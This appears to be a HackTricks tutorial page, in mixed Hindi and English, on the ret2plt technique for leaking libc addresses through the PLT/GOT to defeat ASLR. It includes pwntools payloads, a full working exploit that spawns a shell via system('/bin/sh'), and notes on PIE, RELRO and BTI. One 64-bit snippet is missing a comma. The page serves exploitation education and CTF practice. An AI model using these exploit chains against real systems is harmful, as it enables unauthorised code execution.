# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

इस तकनीक का लक्ष्य **PLT से किसी फ़ंक्शन का पता leak करना** होगा ताकि ASLR को bypass किया जा सके। क्योंकि, उदाहरण के लिए, यदि आप libc से फ़ंक्शन `puts` का पता leak करते हैं, तो तब आप **यह गणना कर सकते हैं कि `libc` का बेस कहाँ है** और अन्य फ़ंक्शनों जैसे **`system`** तक पहुँचने के लिए offsets की गणना कर सकते हैं।

यह `pwntools` payload के साथ किया जा सकता है, जैसे ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

ध्यान दें कि exploit में `main` का पता इस्तेमाल किया गया है, ताकि जब `puts` अपना निष्पादन समाप्त करे, तो **binary calls `main` again instead of exiting** (इससे the leaked address वैध बना रहेगा)।

> [!CAUTION]
> ध्यान दें कि यह काम करने के लिए **binary cannot be compiled with PIE** या आपको **found a leak to bypass PIE** होना चाहिए ताकि PLT, GOT और main के पते पता चल सकें। अन्यथा, आपको पहले PIE को बायपास करना होगा।

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). यह उस **example** का अंतिम exploit था:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## आधुनिक विचार

- **`-fno-plt` builds** (common in modern distros) `call foo@plt` को `call [foo@got]` से बदल देते हैं। यदि binary में `foo@plt` stub नहीं है, तो आप अभी भी `puts(elf.got['foo'])` के साथ resolved address को leak कर सकते हैं और फिर **GOT entry पर सीधे return करें** (`flat(padding, elf.got['foo'])`) ताकि lazy binding पूरा होते ही libc में jump किया जा सके।
- **Full RELRO / `-Wl,-z,now`**: GOT केवल पढ़ने‑योग्य है पर ret2plt अभी भी leaks के लिए काम करता है क्योंकि आप सिर्फ GOT slot पढ़ रहे होते हैं। अगर symbol कभी call नहीं हुआ था, तो आपकी पहली ret2plt भी lazy binding करेगी और फिर resolved slot को print कर देगी।
- **ASLR + PIE**: अगर PIE enabled है, तो पहले एक code pointer leak करें (उदा., saved return address, function pointer, या `.plt` entry किसी अन्य format‑string/infoleak के माध्यम से) ताकि PIE base निकाला जा सके, फिर rebased PLT/GOT addresses के साथ ret2plt chain बनाएं।
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries valid BTI landing pads (`bti c`) हैं, इसलिए BTI‑enabled binaries पर exploit करते समय PLT stub (या किसी अन्य BTI‑annotated gadget) में jump करना बेहतर है बजाय सीधे बिना BTI वाले libc gadget में जाने के — वरना CPU `BRK`/`PAC` failures दिखाएगा।
- **Quick resolution helper**: अगर target function अभी तक resolved नहीं है और आपको एक single‑shot में leak चाहिए, तो PLT call को दो बार chain करें: पहले `elf.plt['foo']` (to resolve) और फिर फिर से `elf.plt['foo']` GOT address को argument के रूप में देकर अब भरे हुए slot को print करने के लिए।

## अन्य उदाहरण और संदर्भ

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, पहला कदम overflow भरना है जब तक canary के 0x00 बाइट तक न पहुँचे, फिर puts को call करके उसे leak करें। canary मिलने के बाद एक ROP gadget बनाया जाता है जो puts को call करके GOT से puts का address leak करे और फिर एक ROP gadget `system('/bin/sh')` को call करे।
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, child function से main में stack overflow। puts को call करने वाला ROP gadget GOT से puts का address leak करने के लिए और फिर एक one gadget को call करने के लिए।

## संदर्भ

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
